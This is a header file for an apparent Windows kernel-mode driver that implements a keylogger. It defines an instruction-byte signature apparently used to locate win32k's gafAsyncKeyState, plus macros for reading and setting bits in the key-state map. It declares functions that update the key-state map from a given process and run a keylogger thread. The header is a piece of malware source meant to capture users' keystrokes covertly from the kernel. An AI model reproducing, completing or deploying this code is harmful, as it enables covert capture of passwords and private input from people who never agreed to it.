#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "WinTypes.hpp"
#include "MemoryUtils.hpp"
#include "DriverMeta.hpp"

#define MOV_RAX_QWORD_BYTE1 0x48
#define MOV_RAX_QWORD_BYTE2 0x8B
#define MOV_RAX_QWORD_BYTE3 0x05

//
// https://github.com/mirror/reactos/blob/c6d2b35ffc91e09f50dfb214ea58237509329d6b/reactos/win32ss/user/ntuser/input.h#L91
//
#define GET_KS_BYTE(vk) ((vk) * 2 / 8)
#define GET_KS_DOWN_BIT(vk) (1 << (((vk) % 4)*2))
#define GET_KS_LOCK_BIT(vk) (1 << (((vk) % 4)*2 + 1))
#define IS_KEY_DOWN(ks, vk) (((ks)[GET_KS_BYTE(vk)] & GET_KS_DOWN_BIT(vk)) ? TRUE : FALSE)
#define IS_KEY_LOCKED(ks, vk) (((ks)[GET_KS_BYTE(vk)] & GET_KS_LOCK_BIT(vk)) ? TRUE : FALSE)
#define SET_KEY_DOWN(ks, vk, down) (ks)[GET_KS_BYTE(vk)] = ((down) ? \
                                                            ((ks)[GET_KS_BYTE(vk)] | GET_KS_DOWN_BIT(vk)) : \
                                                            ((ks)[GET_KS_BYTE(vk)] & ~GET_KS_DOWN_BIT(vk)))
#define SET_KEY_LOCKED(ks, vk, down) (ks)[GET_KS_BYTE(vk)] = ((down) ? \
                                                              ((ks)[GET_KS_BYTE(vk)] | GET_KS_LOCK_BIT(vk)) : \
                                                              ((ks)[GET_KS_BYTE(vk)] & ~GET_KS_LOCK_BIT(vk)))

#include "VK.hpp"

CONST CHAR* BeVkToChar(_In_ UINT8 vk);

VOID
BeUpdateKeyStateMap(
    _In_ CONST HANDLE& procId,
    _In_ CONST PVOID& gafAsyncKeyStateAddr
);

BOOLEAN
BeWasKeyPressed(
    _In_ UINT8 vk
);

PVOID BeGetGafAsyncKeyStateAddress();

VOID BeKeyLoggerFunction(
    _In_ PVOID startContext
);